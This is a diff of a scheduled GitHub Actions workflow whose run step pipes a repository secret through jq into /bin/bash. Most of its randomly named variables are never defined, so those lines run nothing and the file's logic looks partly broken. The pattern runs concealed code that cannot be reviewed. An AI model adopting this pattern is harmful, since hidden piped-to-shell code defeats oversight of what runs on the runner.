@@ -1,22 +1,28 @@
 name: shilindongxing
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 4/6 * * *'
+    - cron: '50 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shilindongxing
         env:
-          r637: ${{ secrets.r637 }}
+          vmzd49702: ${{ secrets.vmzd49702 }}
         run: |
-          echo $r637 | jq -r .hxs0878 | /bin/bash
-          echo $gty7196 | jq -r .fqiz8 | /bin/bash
-          echo $iglrf91402 | jq -r .cf268 | /bin/bash
-          echo $v3953 | jq -r .sbhzv4065 | /bin/bash
-          echo $wzg270 | jq -r .uwosn65 | /bin/bash
-          echo $t64685 | jq -r .j92 | /bin/bash
+          echo $vmzd49702 | jq -r .crb9 | /bin/bash
+          echo $tc385 | jq -r .ecew611 | /bin/bash
+          echo $hrtzx59 | jq -r .tz115 | /bin/bash
+          echo $ei447 | jq -r .vycu48 | /bin/bash
+          echo $yy1862 | jq -r .zpeke4378 | /bin/bash
+          echo $yhqyb5 | jq -r .n258 | /bin/bash
+          echo $kdg1614 | jq -r .gin99 | /bin/bash
+          echo $as713 | jq -r .ehpk19568 | /bin/bash
+          echo $pfnvq87 | jq -r .arlhp4425 | /bin/bash
+          echo $mbqyu35342 | jq -r .lok561 | /bin/bash
+          echo $hbb98 | jq -r .huz9 | /bin/bash
+          echo $fpa05 | jq -r .kykrd574 | /bin/bash
 
